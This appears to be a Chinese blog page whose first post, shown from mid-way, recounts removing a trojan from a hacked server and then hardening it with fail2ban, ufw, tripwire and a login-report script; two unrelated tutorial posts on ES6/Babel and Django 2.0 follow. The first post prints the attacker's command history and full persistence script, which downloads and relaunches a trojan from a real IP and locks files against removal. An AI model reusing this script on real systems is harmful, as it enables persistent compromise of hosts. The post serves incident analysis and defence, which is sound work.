<h1 id="kill-13648-杀掉apache2-sh"><a href="#kill-13648-杀掉apache2-sh" class="headerlink" title="kill 13648  # 杀掉apache2.sh"></a>kill 13648  # 杀掉apache2.sh</h1><h1 id="kill-14519-杀掉”icnanker”"><a href="#kill-14519-杀掉”icnanker”" class="headerlink" title="kill 14519  # 杀掉”icnanker”"></a>kill 14519  # 杀掉”icnanker”</h1><h1 id="kill-26595-杀掉-sshd"><a href="#kill-26595-杀掉-sshd" class="headerlink" title="kill 26595  # 杀掉.sshd"></a>kill 26595  # 杀掉.sshd</h1><p>清除木马</p>
<p>再次查看命令记录和apache2.sh，确定清除木马的步骤：</p>
<h1 id="history-1"><a href="#history-1" class="headerlink" title="history"></a>history</h1><p>(…)<br>    4  cp /usr/bin/wget /usr/bin/vget<br>    5  cp /usr/bin/chattr /usr/bin/lockr<br>    6  chmod 0 /usr/bin/chattr;chmod 0 /usr/bin/wget<br>    7  lockr +i /usr/bin/chattr;lockr +i /usr/bin/wget<br>    8  chmod 0755 /usr/bin/vget;chmod 0755 /usr/bin/lockr<br>    9  vget <a href="http://183.60.149.202:8080/apache2.sh" target="_blank" rel="noopener">http://183.60.149.202:8080/apache2.sh</a><br>    10  mv /root/apache2.sh /etc/init.d/apache2.sh<br>    11  chmod 0755 /etc/init.d/apache2.sh<br>    12  nohup sh /etc/init.d/apache2.sh &gt;/dev/null 2&gt;&amp;1 &amp;<br>    13  lockr +i /etc/init.d/apache2.sh<br>    14  vi /etc/rc.local<br>    15  lockr +i /etc/rc.local<br>    16  less /etc/init.d/apache2.sh</p>
<h1 id="cat-etc-init-d-apache2-sh-1"><a href="#cat-etc-init-d-apache2-sh-1" class="headerlink" title="cat /etc/init.d/apache2.sh"></a>cat /etc/init.d/apache2.sh</h1><p>#!/bin/sh<br>while [ 1 -gt 0 ];do<br>Get=”/usr/bin/vget”<br>Lok=”/usr/bin/lockr”<br>Bak=”/usr/bin/.filebak”<br>hosts=”/etc/hosts.bak”<br>File=”/usr/bin/icnanker”<br>if [ ! -f  “$hosts” ];then<br>    cp -f /etc/hosts.deny /etc/hosts.bak<br>    lockr +i /etc/hosts.bak<br>fi<br>if [ ! -f  “$Lok” ];then<br>    cp -f /usr/bin/chattr /usr/bin/lockr<br>    cp -f /usr/bin/chattr /usr/bin/.locks<br>    cp -f /usr/bin/.locks /usr/bin/lockr<br>    chmod 0755 /usr/bin/lockr<br>    chmod 0755 /usr/bin/.locks<br>    lockr +i /usr/bin/lockr<br>    lockr +i /usr/bin/.locks<br>fi<br>if [ ! -f  “$Get” ];then<br>    cp -f /usr/bin/wget /usr/bin/vget<br>    cp -f /usr/bin/wget /usr/bin/.bget<br>    cp -f /usr/bin/.bget /usr/bin/vget<br>    chmod 0755 /usr/bin/vget<br>    chmod 0755 /usr/bin/.bget<br>    lockr +i /usr/bin/vget<br>    lockr +i /usr/bin/.bget<br>fi<br>Exist=<code>ss|grep 183.60.149.202:43200|grep -v &quot;grep&quot;</code><br>if [ -z “$Exist” ];then<br>    lockr -i /usr/bin/.filebak<br>    lockr -i /usr/bin/icnanker<br>    chmod 0755 /usr/bin/.filebak<br>    chmod 0755 /usr/bin/icnanker<br>    if [ ! -f  “$File” ];then<br>        if [ ! -f  “$Bak” ];then<br>            rm -f /etc/init.d/icnanker;rm -f /etc/init.d/icnanker.1<br>            vget -P /etc/init.d/ vget <a href="http://183.60.149.202:8080/icnanker" target="_blank" rel="noopener">http://183.60.149.202:8080/icnanker</a><br>            mv /etc/init.d/icnanker /usr/bin/icnanker<br>        else<br>            cp -f /usr/bin/.filebak /usr/bin/icnanker<br>        fi<br>    fi<br>    pkill icnanker;pkill icnanker<br>    chmod 0755 /usr/bin/icnanker<br>    lockr +i /usr/bin/icnanker<br>    /usr/bin/icnanker<br>fi<br>if [ ! -f  “$Bak” ];then<br>    cp -f /usr/bin/icnanker /usr/bin/.filebak<br>    chmod 0755 /usr/bin/.filebak<br>    lockr +i /usr/bin/.filebak<br>fi<br>chmod 0 /usr/bin/wget<br>lockr +i /usr/bin/wget<br>chmod 0 /usr/bin/chattr<br>lockr +i /usr/bin/chattr<br>chmod 0 /usr/lib/sftp-server<br>lockr +i /usr/lib/sftp-server<br>lockr -i /etc/hosts.deny;cp /etc/hosts.bak /etc/hosts.deny;lockr +i /etc/hosts.deny<br>sleep 30<br>done<br>哼，╭(╯^╰)╮，居然敢这样玩我。这几行命令和脚本试图干扰我把病毒从机器上删除哎：</p>
<p>第一步， 将/usr/bin/chattr复制到/usr/bin/lockr</p>
<p>cp /usr/bin/chattr /usr/bin/lockr</p>
<p>第二步， 将chattr变为不可读不可写不可执行的权限</p>
<p>chmod 0 /usr/bin/chattr</p>
<p>第三步， 锁住chattr，让其变为不可修改</p>
<p>lockr +i /usr/bin/chattr</p>
<p>第四步， 锁住所有其他木马，让其不可删除，如icnanker等。</p>
<p>lockr +i /usr/bin/icnanker</p>
<p>第五步， 将木马程序加入系统开机自启脚本（ /etc/rc.local ）中，每次开机自动运行木马。</p>
<p>这样一来， 如果不懂这段逻辑的话， 要删除病毒如icnanker都会被莫名其妙被拒绝了：</p>
<h1 id="rm-usr-bin-icnanker"><a href="#rm-usr-bin-icnanker" class="headerlink" title="rm /usr/bin/icnanker"></a>rm /usr/bin/icnanker</h1><p>rm: cannot remove ‘icnanker’: Operation not permitted<br>幸好， 我这个人有非常可怕的耐心。马上去查了chattr是干什么的。原来，linux的文件还能设置一些附带的属性。比如有一个属性’i’，它的意思就是”immutable”，即限制文件不可更改（删除、修改文件内容、改变文件权限等）。那么通过lockr +i /usr/bin/icnanker，给icnanker附上了’i’属性之后，就让我没办法删除icnanker了！</p>
<p>“那把icnanker的’i’属性去除呗”， 这是一个很直接的想法。但是这货为了防止我这么做，还记得吗，它把 chattr 这个工具通过 chmod 0 /usr/bin/chattr命令将chattr的执行权限去除了。换言之，我没法运行chattr来去除icnanker的’i’属性！</p>
<p>那是不是就没办法删除这些木马了呢？</p>
<p>NO，NO，NO。将计就计就好了。</p>
<p>还记得吗， 上面那段脚本，把/usr/bin/chattr复制到了/usr/bin/lockr。那我直接使用lockr把chattr解锁不就行了？</p>
<h1 id="lockr-i-usr-bin-chattr"><a href="#lockr-i-usr-bin-chattr" class="headerlink" title="lockr -i /usr/bin/chattr"></a>lockr -i /usr/bin/chattr</h1><h1 id="chmod-755-usr-bin-chattr"><a href="#chmod-755-usr-bin-chattr" class="headerlink" title="chmod 755 /usr/bin/chattr"></a>chmod 755 /usr/bin/chattr</h1><h1 id="chattr-i-usr-bin-icnanker"><a href="#chattr-i-usr-bin-icnanker" class="headerlink" title="chattr -i /usr/bin/icnanker"></a>chattr -i /usr/bin/icnanker</h1><h1 id="rm-usr-bin-icnanker-1"><a href="#rm-usr-bin-icnanker-1" class="headerlink" title="rm /usr/bin/icnanker"></a>rm /usr/bin/icnanker</h1><p>(…)<br>呵呵，这样，就把攻击者设下的圈套一下就解开了。做到这里我觉得攻击者的智商其实值得商榷的。我在智商上，其实应该更高一筹。小小的自娱自乐了一把。。。</p>
<p>木马，就这样一步一步的全部被我搜集起来，过些时候准备一把火烧了它。</p>
<p>接下来，是思考对策的时候了。这次暴破表面上全是弱口令惹的祸，其实还是因为太懒，明明知道很危险，却存在侥幸心理。“嗯，这次一定要采取全面的安全策略！”</p>
<p>进行一些研究之后，准备从两个大方向入手，防护机制和检测机制。一个是加强安全性，增加他们（hacker）进攻难度。另一个是加强警戒，一旦发现有人入侵，能立马知道并且快速响应。</p>
<p>建立城墙<br>（SSH）登录安全策略</p>
<ul>
<li><strong>使用强密码！！</strong>绝大多数暴破都是因为该死的弱口令！</li>
<li><strong>设置ssh不允许root登录！</strong>因为大多数登录暴破都是对于root用户进行暴破的！</li>
<li><strong>不要泄露主机用户名等信息！！</strong>这主要是为了防止针对性暴破，如果别人知道你的用户名，又对你有一些了解的话，其猜中你密码的概率会大大加大。</li>
<li><strong>检查暴破IP并且封禁之！</strong>有个非常好用的工具，其大名为“fail2ban”，它可以扫描主机的登录日志，并且限制单IP失败登录次数，如果超过限制，就会封禁该IP。<br>防火墙</li>
</ul>
<p>防火墙的作用主要是对外关闭不必要的网络服务，减少由常规程序本身的漏洞而带来的隐患。同样，有一个非常好用的工具，“ufw”，可以非常方便的设置防火墙：</p>
<h1 id="ufw-allow-80-tcp"><a href="#ufw-allow-80-tcp" class="headerlink" title="ufw allow 80/tcp"></a>ufw allow 80/tcp</h1><h1 id="ufw-allow-ssh"><a href="#ufw-allow-ssh" class="headerlink" title="ufw allow ssh"></a>ufw allow ssh</h1><p>只开启两个服务，web service和ssh service。</p>
<p>还有一些建议</p>
<p>事实上，攻击我服的方式太多了，暴力破解密码登录只是其中一种，还有很多是利用软件漏洞进行的，还记得上一年一连串令人发指的漏洞吗：HeartBleed, Shellshock！！为了牢记这些惨痛的教训（别人身上的），谨记：</p>
<ul>
<li><strong>关注安全动态，即时更新软件安全补丁！</strong></li>
<li><strong>限制服务，只让该运行的服务运行！</strong></li>
<li><strong>在安装非官方包的时候，提高警惕，小心被掉包!</strong><br>全城警戒<br>建好城墙，就该部署哨兵了。</li>
</ul>
<p>那么该如何监测服务器的健康状态呢？</p>
<p>在linux下还是有一些工具可以使用的，经过一番对比，我最终选择了tripwire。她可以检测linux关键文件的变化情况,比如/usr/bin目录下面的文件。所以我配置了一个crontab，每天早上3点检查一遍系统关键文件，看看是否有问题，并且邮件报告给我。</p>
<p>邮件crontab配置：</p>
<p>30 14 <em> </em> * /usr/sbin/tripwire –check | mail -s “Tripwire report for <code>uname -n</code>“ <a href="mailto:monklof@gmail.com" target="_blank" rel="noopener">monklof@gmail.com</a> -r report.tripwire<br>这样，每天我都可以通过文件查看系统是否被破坏了。</p>
<p>汲取这次教训，为了能每天检测用户登录和情况，我特意写了一个脚本来检查昨天系统的登录情况：</p>
<p>login_review.sh:</p>
<p>#! /usr/bin/env bash</p>
<h1 id="monitor-yesterday’s-login-via-ssh-and-send-report-email"><a href="#monitor-yesterday’s-login-via-ssh-and-send-report-email" class="headerlink" title="monitor yesterday’s login via ssh, and send report email"></a>monitor yesterday’s login via ssh, and send report email</h1><p>date=<code>date -d &quot;yesterday&quot; +&quot;%b %e&quot;</code><br>yesterday_acceptedlog=<code>grep &quot;${date}.*sshd.*Accepted&quot; /var/log/auth.log | grep -v &quot;sudo&quot;</code><br>fail=<code>grep &quot;${date}.*sshd.*Failed&quot; /var/log/auth.log | grep -v &quot;sudo&quot; | wc -l</code></p>
<p>success=<code>printf &quot;%s&quot; &quot;$yesterday_acceptedlog&quot; |wc -l</code></p>
<p>warn=””<br>if [ $success -gt 0 ]<br>then<br>warn=”[WARN] “<br>fi</p>
<p>html=”&lt;!doctype html&gt;</p>
<p><html><br>  <head><title>${warn}SSH Login Reports for <code>uname -n</code> at $date </title></head><br>  <body><br>    <div class="\"result\""><br>     <strong>Success logins:</strong> $success <br><br>     <table border="\"1\"" style="\"border-collapse:" collapse;\"=""><br>       <tr><br>         <th>Time</th><br>         <th>User</th><br>         <th>Login Method</th><br>       </tr><br><code>echo $yesterday_acceptedlog | awk &#39;{if(length !=0)printf \&quot;&lt;tr&gt;&lt;td&gt;%s&lt;/td&gt;&lt;td&gt;%s&lt;/td&gt;&lt;td&gt;%s (%s:%s)&lt;/td&gt;&lt;/tr&gt;\n\&quot;,$3,$9,$7,$11,$13}&#39;</code><br>     </table></div></body></html></p>
<pre><code> &lt;strong&gt;Failed Trys: &lt;/strong&gt; $fail &lt;br /&gt;
&lt;/div&gt;
</code></pre><p>  <br>“</p>
<p>case $1 in<br>-d | –debug)<br>    printf “Success logs: %d\n%s\nRendered Html:\n%s” $success “$yesterday_acceptedlog” “$html”<br>    ;;<br>*)<br>    echo $html | mail -s “${warn}SSH Login Report for <code>uname -n</code> at $date” <a href="mailto:monklof@gmail.com" target="_blank" rel="noopener">monklof@gmail.com</a> -r report.login_review -a “Content-type: text/html”<br>    ;;<br>esac<br>然后也配置一个crontab，每天都检测:</p>
<p>25 14 <em> </em> * /usr/local/bin/login_review.sh<br>这样，我每天就能收到这样的两份报表了：</p>
<img src="/2018/03/30/服务器被黑之后的心路历程/4.png">
<img src="/2018/03/30/服务器被黑之后的心路历程/5.png">
<img src="/2018/03/30/服务器被黑之后的心路历程/6.png">
<p>╮(╯▽╰)╭</p>
<p>博客停了将近一个星期之后，做好了基本的防护，小心翼翼的将服务器再次开启。（以上的安全策略的实施也是在服务开启之后一直在进行的）</p>
<p>服务器重新开启的那天，通过DO的运维界面查看被攻击的那天的流量情况：</p>
<p>可以看到29号那天tcp syn flood流量达到了140Mbps！心有余悸啊心有余悸。</p>
<p>然后接下来的几天，每天都看fail2ban查看被封禁的ip、看报表查看系统健康状况。效果显著，每天的暴破失败尝试量从上万成功降低到500以内。并且至今未出现过问题。</p>
<p>Cheers！这个时候，我的表情是这样的：</p>
<img src="/2018/03/30/服务器被黑之后的心路历程/7.jpg">
      
    </div>
    <footer class="article-footer">
      

      
      
  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/VPS/">VPS</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/firewalld/">firewalld</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/爆破端口/">爆破端口</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/脚本小子/">脚本小子</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/运营/">运营</a></li></ul>

    </footer>
  </div>
  
</article>

<!-- Table of Contents -->

  
    <article id="post-ES6来完成NodeJs"  class="article article-type-post" itemscope itemprop="blogPost" >
  <div id="articleInner" class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 class="thumb" itemprop="name">
      <a class="article-title" href="/2018/03/09/ES6来完成NodeJs/">ES6来完成NodeJs</a>
    </h1>
  

      </header>
    
    <div class="article-meta">
      
	<a href="/2018/03/09/ES6来完成NodeJs/" class="article-date">
	  <time datetime="2018-03-09T06:28:01.000Z" itemprop="datePublished">2018-03-09</time>
	</a>

      
      
    </div>
    <div class="article-entry" itemprop="articleBody">
      
        <p>ES2015或ES6是指JavaScript最新的稳定的迭代版本。</p>
<p>ES6是JavaScript的重大更新，也是自2009年ES5标准化之后的第一次更新。这次更新包括了一些新的语言语法，其中有一部分被看做是语法糖。</p>
<p>目前主流JavaScript引擎还没有完全实现这些新功能，需要进行一些转换才能在旧的JavaScript中使用这些新功能。</p>
<p>在本教程中，我们将使用ES6创建一个<a href="https://expressjs.com/" target="_blank" rel="noopener">Express</a>应用。我们将会使用Babel编译器将ES6代码编译为ES5。</p>
<p>用Babel编译器我们可以在Express应用中使用JavaScript的新特性。当然你也需要治疗JavaScript的基础知识才能够成功完成本教程中的内容。</p>
<p>根据Babel的官网来看，我们可以用它来使用下一代JavaScript、</p>
<p>本教程假设你已经安装了 Node Package Manager(<a href="http://blog.npmjs.org/post/85484771375/how-to-install-npm" target="_blank" rel="noopener">NPM</a>)和 <a href="https://docs.npmjs.com/getting-started/installing-node" target="_blank" rel="noopener">NodeJS 引擎</a>。</p>
<p>学习本教程的时候最好使用 linux 或者 mac Os 系统。当然，使用 windows 系统也可以正常进行。</p>
<h2 id="第一步：安装项目文件夹"><a href="#第一步：安装项目文件夹" class="headerlink" title="第一步：安装项目文件夹"></a>第一步：安装项目文件夹</h2><ul>
<li>创建一个新的文件夹</li>
<li><a href="https://askubuntu.com/questions/375867/how-to-access-a-folder-through-the-terminal" target="_blank" rel="noopener">用terminal进入这个文件夹</a></li>
<li>运行以下命令来初始化你的项目<figure class="highlight coffeescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">npm</span> init -y</span><br></pre></td></tr></table></figure>
</li>
</ul>
<p>这将会帮你在你的项目中创建一个 package.json 文件。在这一步中，你的 package.json 文件应该与下面这个例子非常相似：</p>
<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  <span class="attr">"name"</span>: <span class="string">"es6express"</span>,</span><br><span class="line">  <span class="attr">"version"</span>: <span class="string">"1.0.0"</span>,</span><br><span class="line">  <span class="attr">"description"</span>: <span class="string">""</span>,</span><br><span class="line">  <span class="attr">"main"</span>: <span class="string">"index.js"</span>,</span><br><span class="line">  <span class="attr">"scripts"</span>: &#123;</span><br><span class="line">    <span class="attr">"test"</span>: <span class="string">"echo \"Error: no test specified\" &amp;&amp; exit 1"</span></span><br><span class="line">  &#125;,</span><br><span class="line">  <span class="attr">"author"</span>: <span class="string">""</span>,</span><br><span class="line">  <span class="attr">"license"</span>: <span class="string">"ISC"</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="第二步：创建程序入口"><a href="#第二步：创建程序入口" class="headerlink" title="第二步：创建程序入口"></a>第二步：创建程序入口</h2><ul>
<li>在你项目的根目录下，创建 index.js 文件</li>
</ul>
<h2 id="第三步：安装需要的模块（dependencies-devDependencies-）"><a href="#第三步：安装需要的模块（dependencies-devDependencies-）" class="headerlink" title="第三步：安装需要的模块（dependencies/devDependencies ）"></a>第三步：安装需要的模块（dependencies/devDependencies ）</h2><p>在这一步中，我们将会安装 express 应用需要的模块。</p>
<h3 id="Dependencies"><a href="#Dependencies" class="headerlink" title="Dependencies"></a>Dependencies</h3><p>注意这些依赖是可选的，只是因为我们创建 express 应用才需要。</p>
<ul>
<li><a href="https://expressjs.com/" target="_blank" rel="noopener">express</a>：一个快速的、无限制的、简约的 NodeJS web 框架</li>
<li><a href="https://github.com/expressjs/morgan" target="_blank" rel="noopener">margan</a>：NodeJS 的 http 请求记录中间件</li>
</ul>
<p>要安装这些依赖，在你项目中间夹中打开 terminal，运行以下命令：</p>
<figure class="highlight maxima"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm install --<span class="built_in">save</span> <span class="built_in">express</span> morgan</span><br></pre></td></tr></table></figure>
<p>在这一步，你的项目目录中应该会有一个 node_modules 文件夹，你的 package.json 文件应该与下面的这个例子类似：</p>
<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  <span class="attr">"name"</span>: <span class="string">"es6express"</span>,</span><br><span class="line">  <span class="attr">"version"</span>: <span class="string">"1.0.0"</span>,</span><br><span class="line">  <span class="attr">"description"</span>: <span class="string">""</span>,</span><br><span class="line">  <span class="attr">"main"</span>: <span class="string">"index.js"</span>,</span><br><span class="line">  <span class="attr">"scripts"</span>: &#123;</span><br><span class="line">    <span class="attr">"test"</span>: <span class="string">"echo \"Error: no test specified\" &amp;&amp; exit 1"</span></span><br><span class="line">  &#125;,</span><br><span class="line">  <span class="attr">"author"</span>: <span class="string">""</span>,</span><br><span class="line">  <span class="attr">"license"</span>: <span class="string">"ISC"</span>,</span><br><span class="line">  <span class="attr">"dependencies"</span>: &#123;</span><br><span class="line">    <span class="attr">"express"</span>: <span class="string">"^4.15.2"</span>,</span><br><span class="line">    <span class="attr">"morgan"</span>: <span class="string">"^1.8.1"</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="Development-Dependencies"><a href="#Development-Dependencies" class="headerlink" title="Development Dependencies"></a>Development Dependencies</h3><p>这些依赖是用于在我们项目中使用 babel 编译器的：</p>
<ul>
<li><a href="https://babeljs.io/docs/usage/cli/" target="_blank" rel="noopener">babel-cli</a>：使用 babel 命令行编译文件</li>
<li><a href="https://www.npmjs.com/package/babel-preset-es2015" target="_blank" rel="noopener">babel-preset-es2015 </a>：Babel 为ES2015预设的插件</li>
<li><a href="https://github.com/isaacs/rimraf" target="_blank" rel="noopener">rimraf</a>：在 NodeJS 中使用 unix 命令 rm -rf</li>
</ul>
<p>在这一步，你的 package.json 文件应该与下面这个例子类似：</p>
<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  <span class="attr">"name"</span>: <span class="string">"es6express"</span>,</span><br><span class="line">  <span class="attr">"version"</span>: <span class="string">"1.0.0"</span>,</span><br><span class="line">  <span class="attr">"description"</span>: <span class="string">""</span>,</span><br><span class="line">  <span class="attr">"main"</span>: <span class="string">"index.js"</span>,</span><br><span class="line">  <span class="attr">"scripts"</span>: &#123;</span><br><span class="line">    <span class="attr">"test"</span>: <span class="string">"echo \"Error: no test specified\" &amp;&amp; exit 1"</span></span><br><span class="line">  &#125;,</span><br><span class="line">  <span class="attr">"author"</span>: <span class="string">""</span>,</span><br><span class="line">  <span class="attr">"license"</span>: <span class="string">"ISC"</span>,</span><br><span class="line">  <span class="attr">"dependencies"</span>: &#123;</span><br><span class="line">    <span class="attr">"express"</span>: <span class="string">"^4.15.2"</span>,</span><br><span class="line">    <span class="attr">"morgan"</span>: <span class="string">"^1.8.1"</span></span><br><span class="line">  &#125;,</span><br><span class="line">  <span class="attr">"devDependencies"</span>: &#123;</span><br><span class="line">    <span class="attr">"babel-cli"</span>: <span class="string">"^6.24.0"</span>,</span><br><span class="line">    <span class="attr">"babel-preset-es2015"</span>: <span class="string">"^6.24.0"</span>,</span><br><span class="line">    <span class="attr">"rimraf"</span>: <span class="string">"^2.6.1"</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="第四步：在你项目的根目录下创建一个-Babel-配置文件"><a href="#第四步：在你项目的根目录下创建一个-Babel-配置文件" class="headerlink" title="第四步：在你项目的根目录下创建一个 Babel 配置文件"></a>第四步：在你项目的根目录下创建一个 Babel 配置文件</h2><ul>
<li>运行以下命令来创建一个 babel 配置文件</li>
</ul>
<figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">touch</span> <span class="selector-class">.babelrc</span></span><br></pre></td></tr></table></figure>
<p>这个文件是用来告诉 babel 如何转换你的 JavaScript 文件。我们将会把我们的ES6代码转换为ES5代码。</p>
<ul>
<li>打开你的 .babelrc文件，把以下代码段复制到你的文件中，并保存。</li>
</ul>
<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  <span class="attr">"presets"</span>: [<span class="string">"es2015"</span>]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="第五步：使用-Babel-来编译我们的-JavaScript-文件"><a href="#第五步：使用-Babel-来编译我们的-JavaScript-文件" class="headerlink" title="第五步：使用 Babel 来编译我们的 JavaScript 文件"></a>第五步：使用 Babel 来编译我们的 JavaScript 文件</h2><p>我们要做的下一步就是使用 babel 把我们的 JavaScript 代码从ES6编译为ES5（我们现在还没有写什么 JavaScript 代码）。</p>
<ul>
<li>在你的 package.json 文件中，添加一个 start 和 build 命令。你的 package.json 文件应该与下面例子类似：</li>
</ul>
<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  <span class="attr">"name"</span>: <span class="string">"es6express"</span>,</span><br><span class="line">  <span class="attr">"version"</span>: <span class="string">"1.0.0"</span>,</span><br><span class="line">  <span class="attr">"description"</span>: <span class="string">""</span>,</span><br><span class="line">  <span class="attr">"main"</span>: <span class="string">"index.js"</span>,</span><br><span class="line">  <span class="attr">"scripts"</span>: &#123;</span><br><span class="line">    <span class="attr">"test"</span>: <span class="string">"echo \"Error: no test specified\" &amp;&amp; exit 1"</span>,</span><br><span class="line">    <span class="attr">"build"</span>: <span class="string">"rimraf dist/ &amp;&amp; babel ./ --out-dir dist/ --ignore ./node_modules,./.babelrc,./package.json,./npm-debug.log --copy-files"</span>,</span><br><span class="line">    <span class="attr">"start"</span>: <span class="string">"npm run build &amp;&amp; node dist/index.js"</span></span><br><span class="line">  &#125;,</span><br><span class="line">  <span class="attr">"author"</span>: <span class="string">""</span>,</span><br><span class="line">  <span class="attr">"license"</span>: <span class="string">"ISC"</span>,</span><br><span class="line">  <span class="attr">"dependencies"</span>: &#123;</span><br><span class="line">    <span class="attr">"express"</span>: <span class="string">"^4.15.2"</span>,</span><br><span class="line">    <span class="attr">"morgan"</span>: <span class="string">"^1.8.1"</span>,</span><br><span class="line">    <span class="attr">"rimraf"</span>: <span class="string">"^2.6.1"</span></span><br><span class="line">  &#125;,</span><br><span class="line">  <span class="attr">"devDependencies"</span>: &#123;</span><br><span class="line">    <span class="attr">"babel-cli"</span>: <span class="string">"^6.24.0"</span>,</span><br><span class="line">    <span class="attr">"babel-preset-es2015"</span>: <span class="string">"^6.24.0"</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>恭喜你！你现在已经可以在你的 express 中使用 JavaScript 的新特性了。</p>

      
    </div>
    <footer class="article-footer">
      

      
      
  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Angular/">Angular</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/CSS/">CSS</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Dom/">Dom</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/ES6/">ES6</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/JavaScript/">JavaScript</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/NodeJs/">NodeJs</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/React/">React</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Vue/">Vue</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/前端/">前端</a></li></ul>

    </footer>
  </div>
  
</article>

<!-- Table of Contents -->

  
    <article id="post-Django2-0"  class="article article-type-post" itemscope itemprop="blogPost" >
  <div id="articleInner" class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 class="thumb" itemprop="name">
      <a class="article-title" href="/2017/10/27/Django2-0/">Django2.0</a>
    </h1>
  

      </header>
    
    <div class="article-meta">
      
	<a href="/2017/10/27/Django2-0/" class="article-date">
	  <time datetime="2017-10-27T04:15:18.000Z" itemprop="datePublished">2017-10-27</time>
	</a>

      
      
    </div>
    <div class="article-entry" itemprop="articleBody">
      
        <p>9月23，Django 发布了2.0a1版本，这是一个 feature freeze 版本，如果没有什么意外的话，2.0正式版不会再增加新的功能了。按照以往的规律，预计正式版将在12月发布。</p>
<p>备注：Django 2.0 于12月2日已经正式发布。</p>
<p>2.0无疑是一个里程碑版本，移除了对 Python2.7 的支持，最少需要 3.4 以上，建议使用3.5以上的版本。</p>
<p>What’s new in Django2.0 文档中一共列出了三个新的特性：</p>
<p>更简单的URL路由语法 (Simplified URL routing syntax)<br>admin应用的针对移动设备的优化改进(Mobile-friendly contrib.admin)<br>支持SQL开窗表达式(Window expressions)<br>第一个特性，主要用于动态路由定义上。在Django2.0代码实现中，主要的变化是新增了 django.urls.path 函数，它允许使用一种更加简洁、可读的路由语法。比如之前的版本的代码：</p>
<pre><code>url(r&apos;^articles/(?P&lt;year&gt;[0-9]{4})/$&apos;, views.year_archive),
</code></pre><p>在新版本中也可以写为：<br>    path(‘articles/<a href="int:year" target="_blank" rel="noopener">int:year</a>/‘, views.year_archive),</p>
<p>问题引入<br>下面是Django1.X的一段代码：</p>
<p>‘’’python<br>from django.conf.urls import url<br>def year_archive(request, year):<br>    year = int(year) # convert str to int</p>
<pre><code># Get articles from database
</code></pre><p>def detail_view(request, article_id):<br>    pass<br>def edit_view(request, article_id):<br>    pass<br>def delete_view(request, article_id):<br>    pass<br>urlpatterns = [<br>    url(‘articles/(?P<year>[0-9]{4})/‘, year_archive),<br>    url(‘article/(?P&lt;article_id&gt;[a-zA-Z0-9]+)/detail/‘, detail_view),<br>    url(‘articles/(?P&lt;article_id&gt;[a-zA-Z0-9]+)/edit/‘, edit_view),<br>    url(‘articles/(?P&lt;article_id&gt;[a-zA-Z0-9]+)/delete/‘, delete_view),<br>]<br>‘’’</year></p>

      
    </div>
    <footer class="article-footer">
      

      
      
